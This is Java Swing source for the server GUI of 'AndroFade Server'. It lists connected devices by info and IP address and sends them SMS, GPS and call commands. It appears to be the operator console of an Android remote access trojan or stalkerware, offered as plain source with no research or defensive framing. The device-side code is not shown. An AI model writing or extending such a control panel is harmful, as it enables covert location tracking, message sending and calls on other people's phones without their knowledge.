import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.util.List;

public class ServerGUI extends JFrame {
    
    private JTextArea logArea;
    private JList<String> clientList;
    private DefaultListModel<String> clientModel;
    private JButton sendSMSBtn, getGPSBtn, makeCallBtn, clearLogBtn;

    public ServerGUI() {
        setTitle("AndroFade Server");
        setSize(900, 700);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLocationRelativeTo(null);
        setResizable(true);

        // Main panel
        JPanel mainPanel = new JPanel(new BorderLayout(10, 10));
        mainPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        // Top panel - Clients
        JPanel topPanel = new JPanel(new BorderLayout());
        topPanel.setBorder(BorderFactory.createTitledBorder("Connected Clients"));
        
        clientModel = new DefaultListModel<>();
        clientList = new JList<>(clientModel);
        clientList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        topPanel.add(new JScrollPane(clientList), BorderLayout.CENTER);
        mainPanel.add(topPanel, BorderLayout.NORTH);

        // Center panel - Log
        JPanel centerPanel = new JPanel(new BorderLayout());
        centerPanel.setBorder(BorderFactory.createTitledBorder("Server Log"));
        
        logArea = new JTextArea();
        logArea.setEditable(false);
        logArea.setFont(new Font("Monospaced", Font.PLAIN, 11));
        logArea.setLineWrap(true);
        logArea.setWrapStyleWord(true);
        centerPanel.add(new JScrollPane(logArea), BorderLayout.CENTER);
        mainPanel.add(centerPanel, BorderLayout.CENTER);

        // Bottom panel - Buttons
        JPanel bottomPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 5));
        
        sendSMSBtn = new JButton("Send SMS");
        getGPSBtn = new JButton("Get GPS");
        makeCallBtn = new JButton("Make Call");
        clearLogBtn = new JButton("Clear Log");
        
        sendSMSBtn.addActionListener(this::sendSMS);
        getGPSBtn.addActionListener(this::getGPS);
        makeCallBtn.addActionListener(this::makeCall);
        clearLogBtn.addActionListener(e -> logArea.setText(""));
        
        bottomPanel.add(sendSMSBtn);
        bottomPanel.add(getGPSBtn);
        bottomPanel.add(makeCallBtn);
        bottomPanel.add(clearLogBtn);
        mainPanel.add(bottomPanel, BorderLayout.SOUTH);

        add(mainPanel);
    }

    private void sendSMS(ActionEvent e) {
        int selectedIndex = clientList.getSelectedIndex();
        if (selectedIndex < 0) {
            JOptionPane.showMessageDialog(this, "Select a client first");
            return;
        }
        
        String phone = JOptionPane.showInputDialog(this, "Enter phone number:");
        if (phone == null || phone.isEmpty()) return;
        
        String message = JOptionPane.showInputDialog(this, "Enter SMS message:");
        if (message == null || message.isEmpty()) return;
        
        try {
            List<ClientHandler> clients = Server.getConnectedClients();
            if (selectedIndex < clients.size()) {
                clients.get(selectedIndex).sendCommand("SMS:" + phone + "|" + message);
                log("SMS command sent to device");
            }
        } catch (Exception ex) {
            log("Error sending SMS: " + ex.getMessage());
        }
    }

    private void getGPS(ActionEvent e) {
        int selectedIndex = clientList.getSelectedIndex();
        if (selectedIndex < 0) {
            JOptionPane.showMessageDialog(this, "Select a client first");
            return;
        }
        
        try {
            List<ClientHandler> clients = Server.getConnectedClients();
            if (selectedIndex < clients.size()) {
                clients.get(selectedIndex).sendCommand("GPS");
                log("GPS command sent to device");
            }
        } catch (Exception ex) {
            log("Error getting GPS: " + ex.getMessage());
        }
    }

    private void makeCall(ActionEvent e) {
        int selectedIndex = clientList.getSelectedIndex();
        if (selectedIndex < 0) {
            JOptionPane.showMessageDialog(this, "Select a client first");
            return;
        }
        
        String phone = JOptionPane.showInputDialog(this, "Enter phone number:");
        if (phone == null || phone.isEmpty()) return;
        
        try {
            List<ClientHandler> clients = Server.getConnectedClients();
            if (selectedIndex < clients.size()) {
                clients.get(selectedIndex).sendCommand("CALL:" + phone);
                log("CALL command sent to device");
            }
        } catch (Exception ex) {
            log("Error making call: " + ex.getMessage());
        }
    }

    public void log(String message) {
        logArea.append("[" + new java.text.SimpleDateFormat("HH:mm:ss").format(new java.util.Date()) + "] " + message + "\n");
        logArea.setCaretPosition(logArea.getDocument().getLength());
    }

    public void updateClientList(List<?> clients) {
        clientModel.clear();
        for (Object client : clients) {
            if (client instanceof ClientHandler) {
                ClientHandler handler = (ClientHandler) client;
                String info = handler.getDeviceInfo() + " (" + handler.getClientIP() + ")";
                clientModel.addElement(info);
            }
        }
    }

    public void show() {
        setVisible(true);
    }
}
